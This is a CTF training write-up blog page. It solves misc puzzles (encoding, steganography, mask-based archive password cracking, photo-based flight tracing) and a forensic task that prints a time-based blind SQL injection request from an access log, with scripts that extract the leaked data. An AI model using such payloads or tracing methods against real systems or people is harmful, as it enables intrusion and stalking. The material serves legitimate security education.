<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XAUTCTF2024NewCupPartr2暨2025冬季赛-官方题解 | BR-blog</title><meta name="author" content="BR"><meta name="copyright" content="BR"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="[TOC] MiscSignIn题目描述 	出题人: Peng	难度: 签到 ​	%58%41%55%54%43%54%46%7B%57%65%31%63%30%6D%65%5F%74%30%5F%58%41%55%54%43%54%46%7D 题解 ​	URL解码即可  try题目描述 ​	出题人: Peng​	难度: 入门 ​	黑客意外获得了Peng常用密码的前5位13897，但不知道具体的位">
<meta property="og:type" content="article">
<meta property="og:title" content="XAUTCTF2024NewCupPartr2暨2025冬季赛-官方题解">
<meta property="og:url" content="https://blog.yzbrh.top/post/27dd2185.html">
<meta property="og:site_name" content="BR-blog">
<meta property="og:description" content="[TOC] MiscSignIn题目描述 	出题人: Peng	难度: 签到 ​	%58%41%55%54%43%54%46%7B%57%65%31%63%30%6D%65%5F%74%30%5F%58%41%55%54%43%54%46%7D 题解 ​	URL解码即可  try题目描述 ​	出题人: Peng​	难度: 入门 ​	黑客意外获得了Peng常用密码的前5位13897，但不知道具体的位">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.yzbrh.top/img/avatar.jpg">
<meta property="article:published_time" content="2025-01-22T09:41:31.000Z">
<meta property="article:modified_time" content="2025-01-22T09:41:31.000Z">
<meta property="article:author" content="BR">
<meta property="article:tag" content="WriteUp">
<meta property="article:tag" content="网络安全">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="XAUTCTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.yzbrh.top/img/avatar.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "XAUTCTF2024NewCupPartr2暨2025冬季赛-官方题解",
  "url": "https://blog.yzbrh.top/post/27dd2185.html",
  "image": "https://blog.yzbrh.top/img/avatar.jpg",
  "datePublished": "2025-01-22T09:41:31.000Z",
  "dateModified": "2025-01-22T09:41:31.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "BR",
      "url": "https://blog.yzbrh.top/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/logo.ico"><link rel="canonical" href="https://blog.yzbrh.top/post/27dd2185.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
          
          if (theme === undefined) {
            if (mediaQueryLight.matches) activateLightMode()
            else if (mediaQueryDark.matches) activateDarkMode()
            else {
              const hour = new Date().getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            mediaQueryDark.addEventListener('change', () => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else {
            theme === 'light' ? activateLightMode() : activateDarkMode()
          }
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'XAUTCTF2024NewCupPartr2暨2025冬季赛-官方题解',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/custom.css?3"><link rel="stylesheet" href="/css/universe.css?1"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(https://bing.img.run/1920x1080.php);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活(建设中)</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comment-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者(建设中)</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://bing.img.run/rand.php);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">BR-blog</span></a><a class="nav-page-title" href="/"><span class="site-name">XAUTCTF2024NewCupPartr2暨2025冬季赛-官方题解</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活(建设中)</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comment-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者(建设中)</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">XAUTCTF2024NewCupPartr2暨2025冬季赛-官方题解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-22T09:41:31.000Z" title="发表于 2025-01-22 17:41:31">2025-01-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-01-22T09:41:31.000Z" title="更新于 2025-01-22 17:41:31">2025-01-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WriteUp/">WriteUp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.4w</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>63分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;已经过了&quot;,&quot;messageNext&quot;:&quot;天自上次更新,文章内容可能已经过时&quot;,&quot;postUpdate&quot;:&quot;2025-01-22 17:41:31&quot;}" hidden></div><p>[TOC]</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><p><strong>题目描述</strong></p>
<p><b style="color:cyan;">	出题人: </b>Peng<br><b style="color:cyan;">	难度: </b>签到</p>
<p>​	%58%41%55%54%43%54%46%7B%57%65%31%63%30%6D%65%5F%74%30%5F%58%41%55%54%43%54%46%7D</p>
<p><strong>题解</strong></p>
<p>​	URL解码即可</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250119223641022.png" alt="image-20250119223641022"></p>
<h3 id="try"><a href="#try" class="headerlink" title="try"></a>try</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>Peng<br>​	<b style="color:cyan;">难度: </b>入门</p>
<p>​	黑客意外获得了Peng常用密码的前5位<code>13897</code>，但不知道具体的位数，请你尝试恢复出完整的密码。</p>
<p><strong>题解</strong></p>
<p>​	根据题目猜测为11位手机号</p>
<p>​	使用<code>Advanced Archive Password Recovery</code>爆破，攻击类型选掩码，暴力范围选所有数字，掩码处填<code>13897??????</code></p>
<p>​	点击开始，约2分钟即可爆破成功，没猜出具体位数的话依次增加<code>?</code>的个数尝试即可</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250119224442031.png" alt="image-20250119224442031"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XAUTCTF&#123;Cell_phone_numbers_are_also_weak_passwords&#125;</span><br></pre></td></tr></table></figure>



<h3 id="QR-code？"><a href="#QR-code？" class="headerlink" title="QR_code？"></a>QR_code？</h3><p><strong>题目描述</strong></p>
<p><b style="color:cyan;">	出题人: </b>Peng<br><b style="color:cyan;">	难度: </b>中等</p>
<p>​	Peng在github上发现了一个好玩的项目，竟然可以利用摄像头传输文件！</p>
<p><strong>题解</strong></p>
<p>​	根据题目描述，以及文件名<code>cimbar.jpg</code>，搜索发现github项目<a target="_blank" rel="noopener" href="https://github.com/sz3/libcimbar">sz3&#x2F;libcimbar</a></p>
<p>​	阅读发现可以安装<a target="_blank" rel="noopener" href="https://github.com/sz3/cfc/releases/download/v0.6.1/cfc_arm64-v8a_0.6.1.apk">解码软件</a>，没有安卓手机可以使用安卓模拟器</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120005130275.png" alt="image-20250120005130275"></p>
<p>​	扫描成功后保存文件，然后上传到电脑查看，使用010 Editor打开，观察文件头发现是png文件</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120010047451.png" alt="image-20250120010047451"></p>
<p>​	修改文件后缀后打开图片，看起来像二维码</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120010147086.png" alt="image-20250120010147086"></p>
<p>​	在cimbar.png的文件尾发现提示<code>HanXin_code</code></p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120010228188.png" alt="image-20250120010228188"></p>
<p>​	搜索发现是汉信码，使用<a target="_blank" rel="noopener" href="https://tuzim.net/hxdecode/">在线解码工具</a>解码失败，观察汉信码的构成，发现图片疑似被反色</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120010606011.png" alt="image-20250120010606011"></p>
<p>​	使用随波逐流的图片反色即可</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120010832679.png" alt="image-20250120010832679"></p>
<p>​	在线扫码工具扫码得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XAUTCTF&#123;H4nX1n_c0de_1s_am4z1ng&#125;</span><br></pre></td></tr></table></figure>



<h3 id="滴滴嗒嗒"><a href="#滴滴嗒嗒" class="headerlink" title="滴滴嗒嗒"></a>滴滴嗒嗒</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>Peng<br><b style="color:cyan;">	难度: </b>普通</p>
<p>​	嗒滴滴 滴 滴 滴嗒嗒滴 滴滴滴 嗒嗒嗒 滴滴嗒 嗒滴 嗒滴滴</p>
<p><strong>题解</strong></p>
<p>​	根据题目描述，听音频，猜测为摩斯电码</p>
<p>​	<a target="_blank" rel="noopener" href="https://www.lddgo.net/encrypt/morse">在线解码</a>，自定义短码为滴，长码为嗒，得到提示<code>deepsound</code></p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120014458589.png" alt="image-20250120014458589"></p>
<p>​	使用在线<a target="_blank" rel="noopener" href="https://morsecodemagic.com/zh/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81%E9%9F%B3%E9%A2%91%E8%A7%A3%E7%A0%81%E5%99%A8/">摩尔斯电码音频解码器</a>，解码得到password:8kf76f0q6ru2nkwf</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120014652048.png" alt="image-20250120014652048"></p>
<p>​	使用deepsound导入音频，密码是小写的（摩斯电码没有大小写区分，都试一下）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8kf76f0q6ru2nkwf</span><br></pre></td></tr></table></figure>

<p>​	点击Extract提取隐藏的flag</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120015110124.png" alt="image-20250120015110124"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XAUTCTF&#123;5e35e341-2b77-4c26-a4ee-b6269ce1d709&#125;</span><br></pre></td></tr></table></figure>



<h3 id="攻击日志分析"><a href="#攻击日志分析" class="headerlink" title="攻击日志分析"></a>攻击日志分析</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>Peng<br><b style="color:cyan;">	难度: </b>中等</p>
<p>​	某网站数据库遭到黑客攻击，请你帮忙分析数据库泄露了什么信息，并尝试解密信息</p>
<p><strong>题解</strong></p>
<p>​	<strong>方法一</strong></p>
<p>​	sql 时间盲注日志，观察日志格式，写正则脚本提取，可以网上查找类似脚本稍作修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;GET /index.php?id=1%22%20and%20if(ascii(substr((select%20group_concat(key)%20from%20aes%20limit%200,1),1,1))=&#x27;50&#x27;,sleep(3),1)%20--+ HTTP/1.1&quot; 200 546</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment"># 用到的一些变量</span></span><br><span class="line">payload_list = []</span><br><span class="line">result_dict = &#123;&#125;</span><br><span class="line">result_list = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下分别为flag、key、iv的正则表达式，此题重点在正则的编写</span></span><br><span class="line">re_str = <span class="string">r&quot;flag\S+\),(\d+),\S+=&#x27;(\d+)&quot;</span></span><br><span class="line"><span class="comment"># re_str = r&quot;key\S+\),(\d+),\S+=&#x27;(\d+)&quot;</span></span><br><span class="line"><span class="comment"># re_str = r&quot;iv\S+\),(\d+),\S+=&#x27;(\d+)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#打开的日志文件，请把脚本放到日志文件同一目录下</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;access.log&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取每一行并存到lines列表里</span></span><br><span class="line">lines = <span class="string">&#x27;&#x27;</span>.join(f.readlines()).split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构建正则对象</span></span><br><span class="line">number_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(re_str))</span><br><span class="line"></span><br><span class="line"><span class="comment">#将每一行匹配到的一组数据放到payload_list列表中</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    number = number_pattern.findall(line)</span><br><span class="line">    <span class="keyword">if</span> number:</span><br><span class="line">        payload_list.append(number[<span class="number">0</span>])</span><br><span class="line">        <span class="comment">#观察每一行匹配到的数据，可以更好地写正则表达式</span></span><br><span class="line">        <span class="built_in">print</span>(number[<span class="number">0</span>]) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;result:&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将匹配到的数据放到字典里</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload_list:</span><br><span class="line">    result_dict[i[<span class="number">0</span>]]=i[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#将字典的值放到列表里</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> result_dict.values():</span><br><span class="line">    result_list.append(<span class="built_in">int</span>(value))</span><br><span class="line"><span class="comment">#将列表里的ascii码转为字符串打印出来</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> result_list:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(j), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>​	key</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2025XAUTCTF-0120</span><br></pre></td></tr></table></figure>

<p>​	iv</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iviviviviviviviv</span><br></pre></td></tr></table></figure>

<p>​	最后，使用cyberchef进行aes解密，密文为提取出的flag</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120183352545.png" alt="image-20250120183352545"></p>
<p><strong>方法二</strong> </p>
<p>​	观察发现，每条日志后面有546或519，546应该是成功的日志，写脚本把含有546的日志提取出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file=<span class="built_in">open</span>(<span class="string">&#x27;access.log&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">w=<span class="built_in">open</span>(<span class="string">&#x27;output.log&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;519&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> line:</span><br><span class="line">        w.write(line)</span><br></pre></td></tr></table></figure>

<p>​	观察发现，字段名有flag，iv，key，猜测为aes加密，表名也有提示是aes加密</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120160014198.png" alt="image-20250120160014198"></p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120160041415.png" alt="image-20250120160041415"></p>
<p>​	手动提出来解ascii码即可</p>
<p>​	此题为动态flag</p>
<h3 id="沙滩，海洋，大冒险！"><a href="#沙滩，海洋，大冒险！" class="headerlink" title="沙滩，海洋，大冒险！"></a>沙滩，海洋，大冒险！</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>BR</br><br>​	<b style="color:cyan;">难度: </b>普通</br></p>
<p>​	“Play, play, and a little competition！”</p>
<p>​	一到假期，BR就迫不急待跑出去玩了！可恶，校赛题还没有出完呢，这怎么能行？！</p>
<p>​	BR不愿意透露自己去哪里玩了，但是我们通过一些社会工程学手段打听到了一些信息。</p>
<p>​	现在你需要基于题目附件给出的提示推断出BR去哪里玩了，并且找到BR<strong>出发时</strong>乘坐的那一班飞机！</p>
<p>​	flag为：XAUTCTF{搭乘的飞机航班号}</p>
<p>​	示例：假如搭乘的是1月31日07:00-09:15从北京首都国际机场飞往上海浦东国际机场的东航MU5100，则flag为：XAUTCTF{MU5100}</p>
<p><strong>题解</strong></p>
<p>​	题目给到聊天记录作为附件：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/chat.png" alt="chat"></p>
<p>​	简单看一遍可以知道对方是从某个地方到另一个地方去，中途经过了转乘，整个过程至少搭乘了高铁和飞机。</p>
<p>​	查看图一：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116011320870.png" alt="image-20250116011320870"></p>
<p>​	看到该图片情景中的道路上有路牌，其离<strong>张骞墓</strong>仅有4公里。</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116011509910.png" alt="image-20250116011509910"></p>
<p>​	可以知道此处大致位于陕西省汉中市城固县。</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116011624450.png" alt="image-20250116011624450"></p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116011648086.png" alt="image-20250116011648086"></p>
<p>​	此处确实也有高铁站和机场，进一步证实我们的判断，可以推测对方是从<strong>汉中城固机场</strong>起飞的。</p>
<p>​	百度识图图三和图四：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116011959616.png" alt="image-20250116011959616"></p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116012102970.png" alt="image-20250116012102970"></p>
<p>​	可以确定目的地在海南海口。</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116012154314.png" alt="image-20250116012154314"></p>
<p>​	目的地机场为<strong>海口美兰国际机场</strong>。</p>
<p>​	在<strong>航旅纵横</strong>(<strong>飞常准</strong>亦可)中可以查询往期航班。</p>
<p>​	结合聊天记录中的时间，进行筛选：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116012509163.png" alt="image-20250116012509163"></p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116012528527.png" alt="image-20250116012528527"></p>
<p>​	找到目标航班，航班号为GX8898，flag为XAUTCTF{GX8898}</p>
<h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><h3 id="应急响应-1钓鱼邮件"><a href="#应急响应-1钓鱼邮件" class="headerlink" title="应急响应-1钓鱼邮件"></a>应急响应-1钓鱼邮件</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>Peng<br>​	<b style="color:cyan;">难度: </b>简单<br><b style="color:cyan;">	下载链接: </b><a target="_blank" rel="noopener" href="https://qm.qq.com/q/eIr3qSzlIY">群文件</a> | <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1N9ZHtOrxwuPbb7WdAr1gNw?pwd=XAUT">百度网盘</a><br><b style="color:cyan;">	解压密码: </b><strong>9345166a-297f-4569-b2cc-7ed6a4331c40</strong></p>
<p>​	近日，Peng的个人电脑遭到黑客攻击，请你帮Peng溯源攻击链。</p>
<p>​	黑客发送的钓鱼邮件的发件地址是？</p>
<p>​	例：XAUTCTF{123456@qq.com}</p>
<p><strong>题解</strong></p>
<p>​	解压，使用Vmware17.x导入虚拟机，点击vmx后缀文件即可导入</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250120172031621.png" alt="image-20250120172031621"></p>
